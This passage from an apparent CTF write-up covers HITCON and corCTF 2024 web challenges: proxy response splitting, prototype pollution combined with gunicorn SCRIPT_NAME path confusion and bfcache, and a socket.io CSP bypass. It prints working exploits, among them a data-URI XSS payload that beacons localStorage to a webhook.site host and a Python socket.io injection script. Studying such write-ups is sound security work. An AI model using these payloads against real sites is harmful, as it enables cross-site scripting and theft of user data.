@@ -1,0 +1,225 @@
+If the content type includes script, it directly sets the content-length to 0, so scripts cannot be loaded.
+
+At this point, we need to use response splitting because the proxy will directly pipe the received response out, so we can construct the following flow:
+
+1. The browser sends the first request, let's call it request A.
+2. In the response of request A, first output the `expect: '100-continue'` header, allowing the proxy server to output the header. At this point, for the browser, the first request has ended, and it has received the response.
+3. The browser sends the second request B, reusing the same connection.
+4. At this point, output the response of request B (but for the proxy, it is still the response of request A), bypassing the content type restriction because the proxy thinks this is response content.
+
+In simple terms, it's similar to request smuggling, but done in reverse.
+
+There are two details here:
+
+1. Through Chrome, there is a limit of 6 concurrent requests to the same domain, ensuring that two of the requests will use the same connection.
+2. The Node.js server, upon receiving `Expect: 100-continue`, will flush first. This step is necessary to bypass Chrome's restrictions.
+
+Once JS can be loaded, we can use the same method to load the service worker and use the `Service-Worker-Allowed: /` header to expand the scope, allowing registration to the entire origin.
+
+
+More details can be found in Maple's writeup: https://github.com/maple3142/My-CTF-Challenges/tree/master/HITCON%20CTF%202024/Private%20Browsing%2B
+
+## corCTF 2024
+
+### web/corctf-challenge-dev - 17 solves
+Author: drakon
+
+A challenge related to Chrome extensions, but the author has already written it in detail, so I won't elaborate: [corCTF 2024 - corctf-challenge-dev](https://cor.team/posts/corctf-2024-corctf-challenge-dev/)
+
+### web/iframe-note - 2 solves
+Author: sterllic
+
+The core code of this challenge is the following segment:
+
+``` html
+<iframe id="iframe"></iframe>
+<script src="{{ url_for('static', filename='axios.min.js') }}"></script>
+<script src="{{ url_for('static', filename='can.min.js') }}"></script>
+<script>
+  window.onload = () => {
+    if (["__proto__", "constructor", "prototype"].some(d => location.search.includes(d))) {
+      return;
+    }
+
+    const qs = can.deparam(location.search.slice(1));
+
+    if (!qs.id) {
+      alert("no id provided");
+      location.href = "/";
+    }
+
+    axios.get(`/iframe/${encodeURIComponent(qs.id)}`)
+    .then(res => {
+      if (res.data.error) {
+        alert("no iframe found with that id!");
+        return;
+      }
+
+      if (!res.data.url.toLowerCase().startsWith("http")) {
+        alert("invalid url");
+        return;
+      }
+
+      document.querySelector("#name").textContent = res.data.name;
+      document.querySelector("#iframe").src = res.data.url;
+      document.querySelector("#iframe").style = res.data.style;
+    });
+  }
+</script>
+```
+
+The backend uses Flask + gunicorn to render the above webpage.
+
+There is a prototype pollution vulnerability in can.js, and even with checks in place, it can still be bypassed using URL encoding. However, the question is what can be done after the pollution occurs.
+
+At first glance, the most suspicious part in the frontend is `document.querySelector("#iframe").src = res.data.url`, but here we need to control the server's response. However, the server has checks in place, so data.url can only start with http.
+
+The final solution is related to the behavior of axios, bfcache, and gunicorn. Gunicorn determines the final path based on the `script_name` in the header. According to the example given in [Gunicorn's handling of PATH_INFO and SCRIPT_NAME can lead to security issues when placed behind a proxy #2650](https://github.com/benoitc/gunicorn/issues/2650):
+
+```python
+requests.get(URL+'/REMOVED/admin/something/bad',
+             headers={'script_name':'REMOVED/'})
+```
+
+If there is an nginx in front that blocks all requests starting with /admin, we can send a request to /REMOVED/admin along with script_name as REMOVED/. Nginx will allow it, but when it reaches gunicorn, it will parse the path as /admin, directly bypassing the previous nginx check.
+
+The part of this challenge that utilizes this behavior is:
+
+```html
+<script src="{{ url_for('static', filename='axios.min.js') }}"></script>
+```
+
+If you execute `curl https://iframe-note.be.ax////example.com/view -H "SCRIPT_NAME: //example.com"`, the final path will be /view, but the base URL will change, rendering the result as:
+
+```html
+<script src="//example.com/static/axios.min.js"></script>
+```
+
+This allows direct control over the src on the page.
+
+The author may have been too lazy to set up an instance to host the payload, so they directly used a data URI, turning the script into `<script src="data:text/javascript,{XSS}">`.
+
+To achieve this result, headers need to be sent in the request, so bfcache is utilized. The process is:
+
+1. First visit the final required URL.
+2. Redirect to the view page, using prototype pollution to send a request with headers via fetch.
+3. Go back to the previous page; at this point, due to bfcache, the response from the previous fetch will be reused, which is the version with headers.
+4. XSS
+
+The author's exploit:
+
+``` html
+<body>
+  <script>
+    // const BASE_URL = "http://localhost:3000";
+    const BASE_URL = "https://iframe-note.be.ax";
+
+    const HOOK_URL = "https://webhook.site/xxxxx";
+
+    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
+    const main = async () => {
+      const dataUrl = `data:text/javascript,navigator.sendBeacon('${HOOK_URL}',JSON.stringify(localStorage))`;
+
+      const win = open(`${BASE_URL}/${dataUrl}/iframe/view`);
+      await sleep(1000);
+
+      win.location = `${BASE_URL}/view?id=view&__%70roto__[headers][SCRIPT_NAME]=${dataUrl}/iframe&__%70roto__[baseURL]=/${dataUrl}/`;
+      await sleep(1000);
+
+      win.location = `${location.origin}/back.html?n=2`;
+    };
+    main();
+  </script>
+</body>
+```
+
+``` html
+<script>
+  const n = parseInt(new URLSearchParams(location.search).get("n"));
+  history.go(-n);
+</script>
+```
+
+### corchat x - 1 solve
+
+Author: larry
+
+A challenge related to socket.io, with three main points:
+
+1. Can send a disconnect event but no actual disconnect occurs.
+2. socket.io's JSONP can be used to bypass CSP.
+3. Use the performance API to list previously loaded resources.
+
+Below is the exploit posted by EhhThing in Discord:
+
+``` py
+import socketio
+import requests
+import time
+import json
+
+base_url = 'https://corchat-x-a6e1f8c45d3ca520.be.ax'
+
+def create_sid():
+    session = requests.Session()
+    login = session.post(f'{base_url}/', data = {}, allow_redirects=False)
+    assert login.status_code == 302, login.status_code
+
+    res = session.get(f'{base_url}/socket.io/', params = {
+        'EIO': 4,
+        'transport': 'polling',
+        't': 'bingus',
+    })
+    assert res.status_code == 200, res.status_code
+
+    socket_session = json.loads(res.text[1:])
+    print('fake session', socket_session)
+
+    res = session.post(f'{base_url}/socket.io/', params = {
+        'EIO': 4,
+        'transport': 'polling',
+        't': 'P3qHGUZ',
+        'sid': socket_session['sid'],
+    }, data = b'40')
+    assert res.status_code == 200, res.status_code
+
+    return socket_session['sid']
+
+bot_session = requests.Session()
+login = bot_session.post(f'{base_url}/', data = {
+    'name': 'FizzBuzz101',
+}, allow_redirects=False)
+assert login.status_code == 302, login.status_code
+
+sio = socketio.Client(http_session=bot_session)
+ready = False
+
+@sio.event
+def connect():
+    global ready
+
+    print('connected!')
+
+    # fake disconnect event so that the bot can connect as well
+    sio.emit('disconnect')
+    time.sleep(1)
+    ready = True
+    print('ready for bot!')
+
+@sio.event
+def message(data):
+    global ready
+
+    if not ready:
+        return
+
+    print('message', data)
+    if data['content'] == 'FizzBuzz101 joined.': # XSS bot opened the chat
+        first_sid = create_sid()
+        js_payload = """
+(window.exfil = data => window.top.opener.top.socket.emit('message', data))
+(window.observer = new parent.PerformanceObserver((list) => { list.getEntries().forEach((entry) => { window.exfil('Flag: ' + decodeURIComponent(entry.name.split('/').pop())); }); }))
+(window.observer.observe({ type: 'resource', buffered: true }))
+""".strip().replace('\n', ',')
+        sio.emit('message', '\\"+'+js_payload+');//')
